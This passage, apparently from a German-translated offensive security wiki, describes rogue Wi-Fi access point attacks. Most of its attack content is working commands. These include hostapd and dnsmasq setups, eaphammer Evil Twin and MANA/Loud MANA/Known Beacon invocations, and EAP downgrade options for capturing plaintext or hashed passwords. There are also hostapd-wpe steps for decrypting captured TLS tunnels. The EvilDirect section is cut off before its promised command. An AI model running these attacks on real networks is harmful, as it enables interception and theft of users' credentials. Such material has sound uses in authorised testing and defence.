- Stationen speichern die ESSID jedes drahtlosen Netzwerks, mit dem sie sich verbinden, in ihrer Preferred Network List (PNL) zusammen mit netzwerkspezifischen Konfigurationsdetails.
- Die PNL wird verwendet, um automatisch bekannte Netzwerke zu verbinden und so die Benutzererfahrung durch Vereinfachung des Verbindungsprozesses zu verbessern.

### Passive Scanning

- APs senden periodisch beacon frames, die ihre Präsenz und Eigenschaften ankündigen, einschließlich der ESSID des AP, sofern das Broadcasting nicht deaktiviert ist.
- Während des passiven Scannings hören Stationen auf beacon frames. Wenn die ESSID eines beacons mit einem Eintrag in der PNL der Station übereinstimmt, kann die Station sich automatisch mit diesem AP verbinden.
- Wissen über die PNL eines Geräts ermöglicht potenzielle Ausnutzung, indem man die ESSID eines bekannten Netzwerks nachahmt und das Gerät dazu verleitet, sich mit einem rogue AP zu verbinden.

### Active Probing

- Active probing beinhaltet, dass Stationen probe requests senden, um nahegelegene APs und deren Eigenschaften zu entdecken.
- Directed probe requests zielen auf eine bestimmte ESSID ab und helfen zu erkennen, ob ein bestimmtes Netzwerk in Reichweite ist, selbst wenn es ein hidden network ist.
- Broadcast probe requests haben ein null SSID-Feld und werden an alle nahegelegenen APs gesendet, sodass die Station prüfen kann, ob ein bevorzugtes Netzwerk vorhanden ist, ohne den Inhalt ihrer PNL offenzulegen.

## Einfacher AP mit Weiterleitung ins Internet

Bevor erklärt wird, wie man komplexere Angriffe durchführt, wird zunächst beschrieben, **wie** man einfach **einen** **AP** **erstellt** und **seinen** **Traffic** auf ein Interface weiterleitet, das mit **dem** **Internet** verbunden ist.

Verwende `ifconfig -a`, um zu prüfen, dass das wlan-Interface für den AP und das Interface, das mit dem Internet verbunden ist, vorhanden sind.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Erstellen Sie die Konfigurationsdatei `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Dann **set IPs** und **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Und dann **starte** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Erstelle eine Konfigurationsdatei `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Beende störende Prozesse** , aktiviere **monitor mode**, und **starte hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Weiterleitung und Umleitung
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Ein evil twin attack nutzt aus, wie WiFi-Clients Netzwerke erkennen: primär wird der Netzwerkname (ESSID) verwendet, ohne dass die base station (access point) sich gegenüber dem client authentifizieren muss. Wichtige Punkte:

- **Difficulty in Differentiation**: Geräte haben Schwierigkeiten, zwischen legitimen und rogue access points zu unterscheiden, wenn sie dieselbe ESSID und denselben Verschlüsselungstyp verwenden. Reale Netzwerke nutzen oft mehrere access points mit derselben ESSID, um die Abdeckung nahtlos zu erweitern.
- **Client Roaming and Connection Manipulation**: Das 802.11-Protokoll erlaubt Geräten, zwischen access points innerhalb desselben ESS zu wechseln. Angreifer können dies ausnutzen, indem sie ein Gerät dazu verleiten, die Verbindung zu seiner aktuellen base station (access point) zu trennen und sich mit einem rogue access point zu verbinden. Dies kann erreicht werden, indem ein stärkeres Signal angeboten oder die Verbindung zum legitimen access point durch Methoden wie deauthentication packets oder jamming gestört wird.
- **Challenges in Execution**: Die erfolgreiche Durchführung eines evil twin attack in Umgebungen mit mehreren, gut platzierten access points kann schwierig sein. Das Deauthenticating eines einzelnen legitimen access points führt oft dazu, dass das Gerät sich mit einem anderen legitimen access point verbindet, es sei denn, der Angreifer kann alle nahegelegenen access points deauthenticate oder den rogue access point strategisch platzieren.

Du kannst einen sehr einfachen Open Evil Twin erstellen (keine Möglichkeit, Traffic ins Internet zu routen), indem du:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Du könntest auch einen Evil Twin mit **eaphammer** erstellen (beachte, dass die Schnittstelle **NICHT** im **monitor** mode sein darf):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Oder mit Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Bitte beachten Sie, dass sich ein Gerät standardmäßig nicht automatisch mit einem Open evil Twin verbindet, wenn ein ESSID in der PNL als WPA geschützt gespeichert ist. Sie können versuchen, den echten AP zu DoS'en und hoffen, dass der Benutzer sich manuell mit Ihrem Open evil twin verbindet, oder Sie können den echten AP DoS'en und einen WPA Evil Twin verwenden, um den handshake zu erfassen (bei dieser Methode können Sie das Opfer nicht dazu bringen, sich mit Ihnen zu verbinden, da Sie den PSK nicht kennen, aber Sie können den handshake erfassen und versuchen, ihn zu cracken).

_Einige OS und AV werden den Benutzer davor warnen, dass die Verbindung zu einem Open-Netzwerk gefährlich ist..._

### WPA/WPA2 Evil Twin

Sie können einen **Evil Twin using WPA/2** erstellen und wenn die Geräte so konfiguriert sind, sich mit diesem SSID per WPA/2 zu verbinden, werden sie versuchen, sich zu verbinden. Allerdings benötigen Sie, **to complete the 4-way-handshake**, auch das **Passwort** zu **kennen**, das der Client verwenden wird. Wenn Sie es **nicht wissen**, wird die **Verbindung nicht abgeschlossen**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Um diesen Angriff zu verstehen, empfehle ich, zuvor die kurze [WPA Enterprise explanation](#wpa-enterprise-mgt) zu lesen.

**Verwendung von hostapd-wpe**

`hostapd-wpe` benötigt eine **Konfigurationsdatei**, um zu funktionieren. Um die Generierung dieser Konfigurationen zu **automatisieren**, kannst du [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) verwenden (lade die python-Datei in _/etc/hostapd-wpe/_ herunter)
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
In der Konfigurationsdatei kannst du viele verschiedene Dinge auswählen, wie ssid, channel, user files, cret/key, dh parameters, wpa version und auth...

[**Verwendung von hostapd-wpe mit EAP-TLS, um jedem Zertifikat die Anmeldung zu ermöglichen.**](evil-twin-eap-tls.md)

**Verwendung von EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Standardmäßig verwendet EAPHammer diese authentication methods (beachte GTC als erstes, um zu versuchen, plaintext passwords zu erhalten, und dann die Nutzung robusterer auth methods):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Dies ist die Standardvorgehensweise, um lange Verbindungszeiten zu vermeiden. Sie können dem Server alternativ auch die Authentifizierungsmethoden vom schwächsten zum stärksten angeben:
```
--negotiate weakest
```
Oder du könntest auch verwenden:

- `--negotiate gtc-downgrade` um eine sehr effiziente GTC-Downgrade-Implementierung zu verwenden (Klartext-Passwörter)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` um manuell die angebotenen Methoden anzugeben (wenn die gleichen Authentifizierungsmethoden in derselben Reihenfolge wie die Organisation angeboten werden, wird der Angriff viel schwerer zu entdecken sein).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Airgeddon verwenden**

`Airgeddon` kann zuvor erzeugte Zertifikate verwenden, um EAP-Authentifizierung für WPA/WPA2-Enterprise-Netzwerke anzubieten. Das gefälschte Netzwerk wird das Verbindungsprotokoll auf EAP-MD5 downgraden, sodass es in der Lage sein wird, **den Benutzer und das MD5 des Passworts zu erfassen**. Später kann der Angreifer versuchen, das Passwort zu cracken.\
`Airggedon` bietet dir die Möglichkeit eines **kontinuierlichen Evil Twin attack (noisy)** oder **nur den Evil Attack zu erstellen, bis sich jemand verbindet (smooth).**

![](<../../images/image (936).png>)

### Debugging von PEAP- und EAP-TTLS-TLS-Tunneln bei Evil Twin-Angriffen

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

In der **configuration** von _hostapd-wpe_ **comment** die Zeile, die _**dh_file**_ enthält (von `dh_file=/etc/hostapd-wpe/certs/dh` zu `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Dadurch wird `hostapd-wpe` Schlüssel mit RSA statt DH austauschen, sodass du den Traffic später **entschlüsseln** kannst, **wenn du den privaten Schlüssel des Servers kennst**.

Starte nun wie gewohnt den **Evil Twin** mit **`hostapd-wpe`** unter Verwendung dieser modifizierten Konfiguration. Starte außerdem **`wireshark`** in der **interface**, die den Evil Twin-Angriff durchführt.

Jetzt oder später (wenn du bereits einige Authentifizierungsversuche erfasst hast) kannst du den privaten RSA-Schlüssel in wireshark hinzufügen unter: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Füge einen neuen Eintrag hinzu und fülle das Formular mit diesen Werten aus: **IP-Adresse = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**wähle deine Schlüsseldatei aus**, um Probleme zu vermeiden wähle eine Schlüsseldatei **ohne Passwortschutz**).

![](<../../images/image (687).png>)

Und schaue dir den neuen **"Decrypted TLS" tab** an:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID- und MAC-Schwarz-/Weißlisten

Verschiedene Typen von Media Access Control Filter Lists (MFACLs) und ihre entsprechenden Modi sowie Auswirkungen auf das Verhalten eines rogue Access Points (AP):

1. **MAC-basierte Whitelist**:
- Der rogue AP wird nur auf Probe-Anfragen von Geräten reagieren, die in der Whitelist aufgeführt sind, und für alle anderen nicht aufgeführten Geräte unsichtbar bleiben.
2. **MAC-basierte Blacklist**:
- Der rogue AP ignoriert Probe-Anfragen von Geräten auf der Blacklist und macht den rogue AP für diese speziellen Geräte effektiv unsichtbar.
3. **SSID-basierte Whitelist**:
- Der rogue AP antwortet nur auf Probe-Anfragen für bestimmte aufgelistete ESSIDs und ist damit für Geräte unsichtbar, deren Preferred Network Lists (PNLs) diese ESSIDs nicht enthalten.
4. **SSID-basierte Blacklist**:
- Der rogue AP wird nicht auf Probe-Anfragen für die spezifischen ESSIDs auf der Blacklist antworten und ist damit für Geräte, die diese Netzwerke suchen, unsichtbar.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Diese Methode erlaubt einem attacker, einen bösartigen access point (AP) zu erstellen, der auf alle probe requests von Geräten antwortet, die versuchen, sich mit Netzwerken zu verbinden. Diese Technik täuscht Geräte, damit sie sich mit dem AP des attackers verbinden, indem sie die Netzwerke imitiert, nach denen die Geräte suchen. Sobald ein Gerät eine Verbindungsanfrage an diesen rogue AP sendet, wird die Verbindung abgeschlossen, sodass das Gerät fälschlicherweise mit dem Netzwerk des attackers verbunden ist.

### MANA

Anschließend begannen Geräte, unsichere Netzwerkantworten zu ignorieren, wodurch die Wirksamkeit der original karma attack abnahm. Es wurde jedoch eine neue Methode eingeführt, bekannt als die MANA attack, von Ian de Villiers und Dominic White. Diese Methode beinhaltet, dass der rogue AP die Preferred Network Lists (PNL) von Geräten erfasst, indem er auf deren broadcast probe requests mit Netzwerknamen (SSIDs) antwortet, die zuvor vom Gerät gespeichert wurden. Dieser ausgeklügelte Angriff umgeht die Schutzmaßnahmen gegen die original karma attack, indem er ausnutzt, wie Geräte bekannte Netzwerke speichern und priorisieren.

Die MANA attack funktioniert, indem sie sowohl directed als auch broadcast probe requests von Geräten überwacht. Bei directed requests protokolliert sie die MAC address des Geräts und den angefragten Netzwerknamen und fügt diese Informationen einer Liste hinzu. Wird eine broadcast request empfangen, antwortet der AP mit Informationen, die mit einem der Netzwerke auf der Geräteliste übereinstimmen, und verlockt so das Gerät, sich mit dem rogue AP zu verbinden.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

Eine **Loud MANA attack** ist eine fortgeschrittene Strategie für Fälle, in denen Geräte kein directed probing verwenden oder ihre Preferred Network Lists (PNL) dem Angreifer nicht bekannt sind. Sie beruht auf dem Prinzip, dass **Geräte im selben Bereich wahrscheinlich einige Netzwerknamen in ihren PNLs teilen**. Anstatt selektiv zu antworten, sendet dieser Angriff Probe-Antworten für jeden Netzwerknamen (ESSID), der in den kombinierten PNLs aller beobachteten Geräte gefunden wird. Dieser breit angelegte Ansatz erhöht die Chance, dass ein Gerät ein bekanntes Netzwerk erkennt und versucht, sich mit dem rogue Access Point (AP) zu verbinden.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Wenn die **Loud MANA attack** nicht ausreicht, stellt die **Known Beacon attack** einen alternativen Ansatz dar. Diese Methode **erzwingt den Verbindungsprozess per Brute-Force, indem sie einen AP simuliert, der auf beliebige Netzwerknamen reagiert und eine Liste potenzieller ESSIDs durchläuft**, die aus einer wordlist abgeleitet sind. Dadurch wird die Anwesenheit zahlreicher Netzwerke simuliert, mit dem Ziel, eine ESSID zu finden, die in der PNL des Opfers enthalten ist, wodurch ein Verbindungsversuch zum gefälschten AP ausgelöst wird. Der Angriff kann verstärkt werden, indem man ihn mit der `--loud` Option kombiniert, um einen aggressiveren Versuch zu starten, Geräte einzufangen.

Eaphammer implementierte diesen Angriff als MANA attack, bei der alle ESSIDs in einer Liste ausgesendet werden (man könnte dies auch mit `--loud` kombinieren, um einen Loud MANA + Known beacons attack zu erzeugen):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

Die **Known Beacon Burst attack** beinhaltet das **schnelle Ausstrahlen von beacon frames für jede in einer Datei gelistete ESSID**. Dadurch entsteht eine dichte Umgebung gefälschter Netzwerke, was die Wahrscheinlichkeit stark erhöht, dass Geräte sich mit dem rogue AP verbinden — besonders in Kombination mit einer MANA attack. Diese Technik nutzt Geschwindigkeit und Masse, um die Netzwerk-Auswahlmechanismen der Geräte zu überlasten.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** ist ein Protokoll, das Geräten ermöglicht, direkt über Wi‑Fi miteinander zu verbinden, ohne einen herkömmlichen drahtlosen Zugangspunkt zu benötigen. Diese Fähigkeit ist in verschiedenen Internet of Things (IoT)-Geräten integriert, wie Druckern und Fernsehern, und ermöglicht direkte Gerät-zu-Gerät-Kommunikation. Ein bemerkenswertes Merkmal von Wi‑Fi Direct ist, dass ein Gerät die Rolle eines Zugangspunkts übernimmt, bekannt als group owner, um die Verbindung zu verwalten.

Die Sicherheit von Wi‑Fi Direct-Verbindungen wird durch **Wi-Fi Protected Setup (WPS)** hergestellt, das mehrere Methoden für sicheres Pairing unterstützt, darunter:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Diese Methoden, insbesondere PIN entry, sind anfällig für dieselben Schwachstellen wie WPS in traditionellen Wi‑Fi-Netzen und damit Ziel ähnlicher Angriffsvektoren.

### EvilDirect Hijacking

**EvilDirect Hijacking** ist ein Angriff, der speziell auf Wi‑Fi Direct abzielt. Er spiegelt das Konzept eines Evil Twin-Angriffs wider, richtet sich jedoch gegen Wi‑Fi Direct-Verbindungen. In diesem Szenario gibt sich ein Angreifer als legitimer group owner aus, mit dem Ziel, Geräte dazu zu bringen, sich mit einer bösartigen Entität zu verbinden. Diese Methode kann mit Tools wie `airbase-ng` ausgeführt werden, indem Kanal, ESSID und MAC-Adresse des nachgeahmten Geräts angegeben werden:

## References

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)


TODO: Schau dir [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) an (login con facebook e imitacionde WPA en captive portals)

{{#include ../../banners/hacktricks-training.md}}
